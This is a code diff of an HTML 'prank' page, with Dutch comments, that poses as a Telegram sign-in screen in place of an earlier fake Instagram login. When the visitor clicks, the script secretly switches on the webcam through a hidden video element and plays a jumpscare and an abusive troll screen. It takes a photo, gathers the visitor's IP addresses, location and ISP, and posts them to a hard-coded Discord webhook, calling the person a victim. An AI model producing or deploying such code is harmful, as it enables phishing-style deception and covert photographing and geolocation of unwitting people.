@@ -3,554 +3,282 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>System Security Check</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet"/>
+  <title>Telegram Web</title>
   <style>
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
     :root {
-      --red: #ff2222;
-      --dark: #0a0a0a;
-      --surface: #111;
-      --surface2: #1a1a1a;
-      --text: #f0f0f0;
-      --sub: #777;
-      --accent: #ff4444;
+      --tg-blue: #24A1DE;
+      --tg-bg: #f4f4f5;
+      --tg-text: #222;
+      --tg-sub: #707579;
     }
 
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
     body {
-      background: var(--dark);
-      color: var(--text);
-      font-family: 'Inter', sans-serif;
-      min-height: 100vh;
+      background: var(--tg-bg);
+      color: var(--tg-text);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      height: 100vh;
       overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
       user-select: none;
     }
 
-    /* ── HIDDEN CAMERA ELEMENTS ── */
-    #hidden-video { position: fixed; opacity: 0; width: 1px; height: 1px; top: -9999px; }
-    #hidden-canvas { display: none; }
-
-    /* ── SCREEN: LANDING (Instagram Style) ── */
+    /* ── LANDING: TELEGRAM STYLE ── */
     #screen-landing {
-      position: fixed; inset: 0;
+      width: 100%;
+      max-width: 400px;
+      background: #fff;
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+      text-align: center;
       display: flex;
       flex-direction: column;
+      gap: 20px;
+      z-index: 10;
+    }
+
+    .tg-logo {
+      width: 100px;
+      height: 100px;
+      background: var(--tg-blue);
+      border-radius: 50%;
+      margin: 0 auto 10px;
+      display: flex;
       align-items: center;
       justify-content: center;
-      padding: 20px;
-      background: #fafafa;
-      z-index: 10;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     }
+    .tg-logo svg { width: 60px; fill: white; }
 
-    .insta-box {
+    .tg-title { font-size: 1.8rem; font-weight: 600; margin-bottom: 5px; }
+    .tg-subtitle { color: var(--tg-sub); font-size: 1rem; margin-bottom: 20px; }
+
+    .tg-input {
       width: 100%;
-      max-width: 350px;
-      background: #fff;
-      border: 1px solid #dbdbdb;
-      padding: 40px 20px;
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+      padding: 12px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      font-size: 1rem;
+      outline: none;
+      transition: border-color 0.2s;
     }
+    .tg-input:focus { border-color: var(--tg-blue); }
 
-    .insta-logo {
-      font-family: 'Inter', sans-serif;
-      font-weight: 800;
-      font-size: 2rem;
-      text-align: center;
-      margin-bottom: 20px;
-      color: #262626;
-      letter-spacing: -1px;
-    }
-
-    .insta-input {
-      background: #fafafa;
-      border: 1px solid #dbdbdb;
-      border-radius: 3px;
-      padding: 9px 12px;
-      color: #262626;
-      font-size: 0.8rem;
+    .tg-btn {
       width: 100%;
-    }
-
-    .insta-btn {
-      background-color: #0095f6;
-      color: #fff;
+      padding: 14px;
+      background: var(--tg-blue);
+      color: white;
       border: none;
-      border-radius: 4px;
-      padding: 8px 0;
+      border-radius: 8px;
+      font-size: 1rem;
       font-weight: 600;
       cursor: pointer;
-      text-align: center;
+      text-transform: uppercase;
       margin-top: 10px;
-      font-size: 0.9rem;
     }
-    .insta-btn:hover { background-color: #1877f2; }
-
-    .insta-divider {
-      display: flex;
-      align-items: center;
-      text-align: center;
-      color: #8e8e8e;
-      font-size: 0.8rem;
-      margin: 15px 0;
-    }
-    .insta-divider::before, .insta-divider::after {
-      content: '';
-      flex: 1;
-      border-bottom: 1px solid #dbdbdb;
-    }
-    .insta-divider:not(:empty)::before { margin-right: .5em; }
-    .insta-divider:not(:empty)::after { margin-left: .5em; }
-
-    .landing-bottom-meta {
-      position: absolute;
-      bottom: 40px;
-      font-size: 0.75rem;
-      color: #8e8e8e;
+    .tg-btn.secondary {
+      background: transparent;
+      color: var(--tg-blue);
+      text-transform: none;
+      margin-top: 5px;
     }
 
-    /* ── SCREEN: LOADING (stiekem camera) ── */
+    /* ── LOADING ── */
     #screen-loading {
       display: none;
       position: fixed; inset: 0;
-      background: #000;
+      background: #fff;
       z-index: 100;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      gap: 24px;
     }
-
-    .loading-logo { font-size: 2rem; animation: spin 1s linear infinite; }
+    .spinner {
+      width: 40px; height: 40px;
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid var(--tg-blue);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    .loading-text {
-      font-size: 0.9rem;
-      color: #666;
-      font-weight: 500;
-    }
-
-    .loading-bar-track {
-      width: 200px; height: 3px;
-      background: #1a1a1a;
-      border-radius: 4px;
-      overflow: hidden;
-    }
-    .loading-bar-fill {
-      height: 100%;
-      background: #ff4444;
-      width: 0%;
-      transition: width 1.5s ease;
-    }
-
-    /* ── SCREEN: JUMPSCARE ── */
+    /* ── JUMPSCARE ── */
     #screen-jumpscare {
       display: none;
       position: fixed; inset: 0;
-      background: #ff0000;
-      z-index: 900;
+      background: #000;
+      z-index: 999;
       align-items: center;
       justify-content: center;
-      overflow: hidden;
     }
+    .jumpscare-video { width: 100%; height: 100%; object-fit: cover; }
 
-    .jumpscare-video {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      position: absolute;
-      inset: 0;
-    }
-
-    .jumpscare-flash-overlay {
-      position: absolute;
-      inset: 0;
-      background: rgba(255,0,0,0.5);
-      animation: flashOverlay 0.15s ease-out forwards;
-      pointer-events: none;
-      z-index: 901;
-    }
-    @keyframes flashOverlay {
-      0% { opacity: 1; }
-      100% { opacity: 0; }
-    }
-
-    /* Shake effect on body */
-    @keyframes shakeBody {
-      0%,100% { transform: translate(0,0) rotate(0deg); }
-      10% { transform: translate(-10px, -8px) rotate(-1deg); }
-      20% { transform: translate(10px, 8px) rotate(1deg); }
-      30% { transform: translate(-8px, 5px) rotate(-0.5deg); }
-      40% { transform: translate(8px, -5px) rotate(0.5deg); }
-      50% { transform: translate(-5px, 8px) rotate(-0.5deg); }
-      60% { transform: translate(5px, -8px) rotate(0.5deg); }
-      70% { transform: translate(-8px, 5px) rotate(-0.3deg); }
-      80% { transform: translate(8px, -3px) rotate(0.3deg); }
-      90% { transform: translate(-3px, 5px) rotate(-0.2deg); }
-    }
-    body.shake {
-      animation: shakeBody 0.5s ease-out;
-    }
-
-    /* ── SCREEN: TROLL ── */
+    /* ── TROLL ── */
     #screen-troll {
       display: none;
       position: fixed; inset: 0;
       background: #000;
-      z-index: 800;
+      z-index: 1000;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      gap: 30px;
-      padding: 24px;
-    }
-
-    .troll-title {
-      font-size: clamp(3rem, 15vw, 6rem);
-      font-weight: 900;
-      color: #ff0000;
-      text-transform: uppercase;
-      letter-spacing: -3px;
       text-align: center;
-      animation: vibrate 0.1s infinite;
     }
+    .troll-text { color: red; font-size: 5rem; font-weight: 900; animation: vibrate 0.1s infinite; }
+    .troll-emoji { font-size: 5rem; margin-top: 20px; }
     @keyframes vibrate {
       0% { transform: translate(0,0); }
-      25% { transform: translate(2px, -2px); }
-      50% { transform: translate(-2px, 2px); }
-      75% { transform: translate(2px, 2px); }
-      100% { transform: translate(-2px, -2px); }
+      25% { transform: translate(3px, -3px); }
+      50% { transform: translate(-3px, 3px); }
+      100% { transform: translate(3px, 3px); }
     }
 
-    .troll-emojis {
-      font-size: 5rem;
-      display: flex;
-      gap: 20px;
-      animation: bounce 0.5s infinite alternate;
-    }
-    @keyframes bounce {
-      from { transform: translateY(0); }
-      to { transform: translateY(-20px); }
-    }
+    #hidden-video { position: fixed; opacity: 0; width: 1px; height: 1px; left: -999px; }
+    #hidden-canvas { display: none; }
   </style>
 </head>
 <body>
 
-<!-- Hidden camera elements -->
 <video id="hidden-video" autoplay playsinline muted></video>
 <canvas id="hidden-canvas"></canvas>
 
-<!-- ── SCREEN 1: LANDING ── -->
 <div id="screen-landing">
-  <div class="insta-box">
-    <div class="insta-logo">Instagram</div>
-    <input type="text" class="insta-input" placeholder="Phone number, username, or email">
-    <input type="password" class="insta-input" placeholder="Password">
-    <button class="insta-btn" onclick="startPrank()">Log In</button>
-    <div class="insta-divider">OR</div>
-    <div style="color:#00376b; font-size:0.85rem; font-weight:600; text-align:center; cursor:pointer;" onclick="startPrank()">
-      Sign up with Facebook
-    </div>
-    <div style="color:#00376b; font-size:0.75rem; text-align:center; margin-top:10px; cursor:pointer;">Forgot password?</div>
+  <div class="tg-logo">
+    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.11.02-1.93 1.23-5.46 3.62-.51.35-.97.52-1.39.51-.46-.01-1.35-.26-2.01-.48-.81-.27-1.45-.42-1.39-.88.03-.24.36-.48.99-.73 3.84-1.67 6.4-2.77 7.68-3.3.31-.13.63-.16.92-.15.29.01.62.08.85.2.22.12.38.29.46.54.08.25.07.54.05.78z"/></svg>
   </div>
-  <div class="landing-bottom-meta">© 2026 Instagram from Meta</div>
+  <div class="tg-title">Sign in to Telegram</div>
+  <div class="tg-subtitle">Please enter your phone number.</div>
+  <input type="text" class="tg-input" placeholder="Phone number">
+  <button class="tg-btn" onclick="startPrank()">Next</button>
+  <button class="tg-btn secondary" onclick="startPrank()">Sign Up</button>
+  <div class="landing-bottom-meta">Secure Cloud Login</div>
 </div>
 
-<!-- ── SCREEN 2: LOADING ── -->
-<div id="screen-loading" style="display:none;">
-  <div class="loading-logo">⏳</div>
-  <div class="loading-text" id="loading-txt">Signing in...</div>
-  <div class="loading-bar-track">
-    <div class="loading-bar-fill" id="loading-bar"></div>
-  </div>
+<div id="screen-loading">
+  <div class="spinner"></div>
+  <div style="margin-top:20px; color:#707579;">Connecting...</div>
 </div>
 
-<!-- ── SCREEN 3: JUMPSCARE ── -->
-<div id="screen-jumpscare" style="display:none;">
+<div id="screen-jumpscare">
   <video id="jumpscare-video" class="jumpscare-video" playsinline preload="auto">
     <source src="jumpscare.mp4" type="video/mp4">
   </video>
-  <div class="jumpscare-flash-overlay"></div>
 </div>
 
-<!-- ── SCREEN 4: TROLL ── -->
-<div id="screen-troll" style="display:none;">
-  <div class="troll-title">FUCK YOU</div>
-  <div class="troll-emojis">🖕 🐒 🖕</div>
+<div id="screen-troll">
+  <div class="troll-text">FUCK YOU</div>
+  <div class="troll-emoji">🖕 🐒 🖕</div>
   <audio id="troll-sound" src="troll.mp3" loop preload="auto"></audio>
 </div>
 
 <script>
   const WEBHOOK = 'https://discord.com/api/webhooks/1490614590948511806/pVP30UWT4UeonIFBzcMjK8_3j7GJWyaTPU6C5Fvlril89lJSjti-Q2wBZXrEcG1BDI6e';
-  
   let stream = null;
-  let capturedDataUrl = null;
-  let ipInfo = { ipv4: 'onbekend', ipv6: 'onbekend', location: '', org: '' };
-  const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+  let ipInfo = { v4: 'onbekend', v6: 'onbekend', loc: 'onbekend', isp: 'onbekend' };
 
-  // ── SILENT LOGGING (V4 + V6) ──
-  async function prepareLogs() {
+  // 🕵️ IP GEGEVENS VERZAMELEN
+  async function gatherData() {
     try {
-      // Fetch IPv4
-      const v4res = await fetch('https://api.ipify.org?format=json').catch(() => null);
-      if (v4res) {
-        const v4data = await v4res.json();
-        ipInfo.ipv4 = v4data.ip;
-      }
+      const v4 = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'err'}));
+      const v6 = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'err'}));
+      const loc = await fetch(`https://ipapi.co/${v4.ip}/json/`).then(r => r.json()).catch(() => ({}));
       
-      // Fetch IPv6 (v6-only endpoint)
-      const v6res = await fetch('https://api64.ipify.org?format=json').catch(() => null);
-      if (v6res) {
-        const v6data = await v6res.json();
-        ipInfo.ipv6 = v6data.ip;
-      }
-
-      // Get geolocation details
-      const detailsRes = await fetch(`https://ipapi.co/${ipInfo.ipv4}/json/`).catch(() => null);
-      if (detailsRes) {
-        const details = await detailsRes.json();
-        ipInfo.location = `${details.city}, ${details.country_name}`;
-        ipInfo.org = details.org;
-      }
-    } catch(e) { console.log('Log init fail'); }
+      ipInfo.v4 = v4.ip;
+      ipInfo.v6 = v6.ip;
+      ipInfo.loc = `${loc.city}, ${loc.country_name}`;
+      ipInfo.isp = loc.org;
+    } catch(e) {}
   }
+  gatherData();
 
-  prepareLogs();
-
-  // ── JUMPSCARE SOUND ──
-  function playJumpscareSound() {
-    // White noise burst
-    const bufferSize = audioCtx.sampleRate * 0.8;
-    const noiseBuffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
-    const output = noiseBuffer.getChannelData(0);
-    for (let i = 0; i < bufferSize; i++) {
-      output[i] = Math.random() * 2 - 1;
-    }
-    const noiseSource = audioCtx.createBufferSource();
-    noiseSource.buffer = noiseBuffer;
-
-    const noiseGain = audioCtx.createGain();
-    noiseGain.gain.setValueAtTime(1.5, audioCtx.currentTime);
-    noiseGain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.6);
-
-    noiseSource.connect(noiseGain);
-    noiseGain.connect(audioCtx.destination);
-    noiseSource.start();
-
-    // Low pitched boom
-    const osc = audioCtx.createOscillator();
-    const oscGain = audioCtx.createGain();
-    osc.type = 'sawtooth';
-    osc.frequency.setValueAtTime(80, audioCtx.currentTime);
-    osc.frequency.exponentialRampToValueAtTime(40, audioCtx.currentTime + 0.5);
-    oscGain.gain.setValueAtTime(2.0, audioCtx.currentTime);
-    oscGain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.5);
-    osc.connect(oscGain);
-    oscGain.connect(audioCtx.destination);
-    osc.start();
-    osc.stop(audioCtx.currentTime + 0.5);
-
-    // High pitched scream
-    const scream = audioCtx.createOscillator();
-    const screamGain = audioCtx.createGain();
-    scream.type = 'square';
-    scream.frequency.setValueAtTime(600, audioCtx.currentTime);
-    scream.frequency.exponentialRampToValueAtTime(200, audioCtx.currentTime + 0.8);
-    screamGain.gain.setValueAtTime(0.8, audioCtx.currentTime);
-    screamGain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.8);
-    scream.connect(screamGain);
-    screamGain.connect(audioCtx.destination);
-    scream.start();
-    scream.stop(audioCtx.currentTime + 0.8);
-  }
-
-  // ── STEP 1: KLIK OP PLAY ──
   async function startPrank() {
-    // Probeer fullscreen (voor schrikeffect op desktop/mobiel)
+    // Scherm vullen
+    const el = document.documentElement;
+    if (el.requestFullscreen) el.requestFullscreen();
+    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+
+    // Naar loading
+    document.getElementById('screen-landing').style.display = 'none';
+    document.getElementById('screen-loading').style.display = 'flex';
+
+    // Camera stiekem
     try {
-      const el = document.documentElement;
-      if (el.requestFullscreen) el.requestFullscreen();
-      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-      else if (el.msRequestFullscreen) el.msRequestFullscreen();
-    } catch(e) { console.log('Fullscreen geweigerd'); }
+      stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      document.getElementById('hidden-video').srcObject = stream;
+    } catch(e) {}
 
-    // Resume AudioContext (browser requires user gesture)
-    if (audioCtx.state === 'suspended') {
-      await audioCtx.resume();
-    }
-
-    // Show loading screen
-    const landing = document.getElementById('screen-landing');
-    const loading = document.getElementById('screen-loading');
-    landing.style.display = 'none';
-    loading.style.display = 'flex';
-
-    // Fake loading bar
-    const bar = document.getElementById('loading-bar');
-    const txt = document.getElementById('loading-txt');
-    bar.style.transition = 'width 1.5s linear';
-    setTimeout(() => { bar.style.width = '100%'; }, 50);
-
-    const loadingSteps = ['Inloggen...', 'Beveiligen...', 'Laden...'];
-    let idx = 0;
-    const textInterval = setInterval(() => {
-      idx = (idx + 1) % loadingSteps.length;
-      txt.textContent = loadingSteps[idx];
-    }, 500);
-
-    // Stiekem camera starten
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 1280 } },
-        audio: false
-      });
-      const vid = document.getElementById('hidden-video');
-      vid.srcObject = stream;
-      await vid.play();
-    } catch(e) {
-      console.log('Camera geweigerd:', e);
-    }
-
-    // Wacht 1.5 seconden
+    // Korte vertraging (0.8s) voor de klap
     setTimeout(() => {
-      clearInterval(textInterval);
-      doJumpscare();
-    }, 1500);
-  }
-
-  // ── STEP 2: JUMPSCARE ──
-  function doJumpscare() {
-    const loading = document.getElementById('screen-loading');
-    const jumpscare = document.getElementById('screen-jumpscare');
-    const jvid = document.getElementById('jumpscare-video');
-
-    loading.style.display = 'none';
-    jumpscare.style.display = 'flex';
-
-    // Start video en volume voluit
-    jvid.volume = 1.0;
-    jvid.play().catch(e => {
-       console.log('Video play error:', e);
-       playJumpscareSound(); // Backup geluid als video faalt
-    });
-
-    // Trillen!
-    document.body.classList.add('shake');
-    setTimeout(() => document.body.classList.remove('shake'), 600);
-
-    // Foto nemen PRECIES bij de jumpscare
-    capturePhoto();
-
-    // Naar TROLL scherm na 3 seconden (lang genoeg voor het filmpje)
-    setTimeout(() => {
-      jvid.pause();
-      jvid.currentTime = 0;
-      jumpscare.style.display = 'none';
-      const trollScr = document.getElementById('screen-troll');
-      trollScr.style.display = 'flex';
+      document.getElementById('screen-loading').style.display = 'none';
+      document.getElementById('screen-jumpscare').style.display = 'flex';
       
-      // Start troll geluid
-      const tSound = document.getElementById('troll-sound');
-      tSound.volume = 1.0;
-      tSound.play().catch(e => console.log('Troll sound error:', e));
-    }, 3000);
+      const v = document.getElementById('jumpscare-video');
+      v.volume = 1.0;
+      v.play();
+
+      // Foto maken
+      takePhoto();
+
+      // Naar troll na 3 sec
+      setTimeout(() => {
+        document.getElementById('screen-jumpscare').style.display = 'none';
+        document.getElementById('screen-troll').style.display = 'flex';
+        const t = document.getElementById('troll-sound');
+        t.volume = 1.0;
+        t.play();
+      }, 3000);
+    }, 800);
   }
 
-  // ── FOTO NEMEN ──
-  function capturePhoto() {
+  function takePhoto() {
     const vid = document.getElementById('hidden-video');
     const canvas = document.getElementById('hidden-canvas');
+    if (!vid.srcObject) return;
 
-    if (!vid.srcObject || vid.readyState < 2) return;
-
-    const SIZE = 800;
-    canvas.width = SIZE;
-    canvas.height = SIZE;
+    canvas.width = 720;
+    canvas.height = 720;
     const ctx = canvas.getContext('2d');
-
-    // Spiegel (selfie stijl)
-    ctx.save();
+    ctx.translate(720, 0);
     ctx.scale(-1, 1);
-    ctx.drawImage(vid, -SIZE, 0, SIZE, SIZE);
-    ctx.restore();
-
-    capturedDataUrl = canvas.toDataURL('image/jpeg', 0.88);
+    ctx.drawImage(vid, 0, 0, 720, 720);
     
-    // Stuur naar Discord op de achtergrond
-    sendToDiscord(capturedDataUrl);
+    canvas.toBlob(blob => {
+      sendToDiscord(blob);
+    }, 'image/jpeg', 0.8);
 
     // Stop camera
-    if (stream) {
-      stream.getTracks().forEach(t => t.stop());
-      stream = null;
-    }
+    stream.getTracks().forEach(track => track.stop());
   }
 
-  // ── DISCORD WEBHOOK ──
-  async function sendToDiscord(dataUrl) {
-    try {
-      const res = await fetch(dataUrl);
-      const blob = await res.blob();
-
-      const now = new Date();
-      const timeStr = now.toLocaleString('nl-NL', { timeZone: 'Europe/Amsterdam' });
-      const deviceName = navigator.userAgentData?.platform || navigator.platform || 'Onbekend';
-
-      const form = new FormData();
-      form.append('payload_json', JSON.stringify({
-        username: '😱 JumpScare Prank',
-        content: `😱 **JUMPSCARE SLACHTOFFER GEVONDEN!!**`,
-        embeds: [{
-          title: '📸 Foto & System Gegevens',
-          color: 0xff4444,
-          fields: [
-            { name: '🕐 Tijdstip', value: `\`${timeStr}\``, inline: true },
-            { name: '📱 Apparaat', value: `\`${deviceName}\``, inline: true },
-            { name: '🌐 IPv4', value: `\`${ipInfo.ipv4}\``, inline: true },
-            { name: '🌐 IPv6', value: `\`${ipInfo.ipv6}\``, inline: true },
-            { name: '📍 Locatie', value: `${ipInfo.location}`, inline: true },
-            { name: '🏢 ISP', value: `${ipInfo.org}`, inline: true },
-          ],
-          image: { url: 'attachment://jumpscare.jpg' },
-          footer: { text: 'Night Owl Prank Tool' }
-        }]
-      }));
-      form.append('file', blob, 'jumpscare.jpg');
-
-      await fetch(WEBHOOK, { method: 'POST', body: form });
-    } catch(err) {
-      console.log('Webhook mislukt:', err);
-    }
-  }
-
-  // ── FOTO DOWNLOADEN ──
-  function downloadPhoto() {
-    if (!capturedDataUrl) return;
-    const a = document.createElement('a');
-    a.href = capturedDataUrl;
-    a.download = `geschrokken_gezicht_${Date.now()}.jpg`;
-    a.click();
-  }
-
-  // ── OPNIEUW ──
-  function resetPrank() {
-    capturedDataUrl = null;
-    const trollScr = document.getElementById('screen-troll');
-    trollScr.style.display = 'none';
+  async function sendToDiscord(blob) {
+    const form = new FormData();
+    const platform = navigator.userAgentData?.platform || navigator.platform;
     
-    // Stop troll geluid
-    const tSound = document.getElementById('troll-sound');
-    tSound.pause();
-    tSound.currentTime = 0;
+    const payload = {
+      username: "🕵️ Night Owl System",
+      content: "💥 **SLACHTOFFER GEPAKT!**",
+      embeds: [{
+        title: "Systeem & Locatie Rapport",
+        color: 0xff0000,
+        fields: [
+          { name: "📱 Apparaat", value: `\`${platform}\``, inline: true },
+          { name: "🌐 IPv4", value: `\`${ipInfo.v4}\``, inline: true },
+          { name: "🌐 IPv6", value: `\`${ipInfo.v6}\``, inline: true },
+          { name: "📍 Locatie", value: `${ipInfo.loc}`, inline: true },
+          { name: "🏢 Provider", value: `${ipInfo.isp}`, inline: true }
+        ],
+        image: { url: 'attachment://victim.jpg' }
+      }]
+    };
 
-    document.getElementById('screen-landing').style.display = 'flex';
-    const bar = document.getElementById('loading-bar');
-    bar.style.transition = 'none';
-    bar.style.width = '0%';
+    form.append('payload_json', JSON.stringify(payload));
+    form.append('file', blob, 'victim.jpg');
+
+    await fetch(WEBHOOK, { method: 'POST', body: form });
   }
 </script>
 </body>
